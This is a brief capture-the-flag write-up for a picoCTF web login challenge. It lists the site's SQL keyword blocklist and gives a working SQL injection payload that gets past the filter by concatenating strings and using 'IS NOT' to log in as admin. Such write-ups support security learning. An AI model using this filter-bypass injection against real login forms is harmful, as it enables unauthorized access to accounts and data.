## Description
This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:35178/ Filter: http://mercury.picoctf.net:35178/filter.php

## Solution
Same as previous challenge. But with advance filters.

checking filter.php: `Filters: or and true false union like = > < ; -- /* */ admin`

We can use this payload: `user=adm'||'in&pass=1'IS+NOT+'fds`
with make sql query like:
```sql
SELECT username, password FROM users WHERE username='adm'||'in' AND password='1'IS NOT 'fds'
```

And will get us the flag.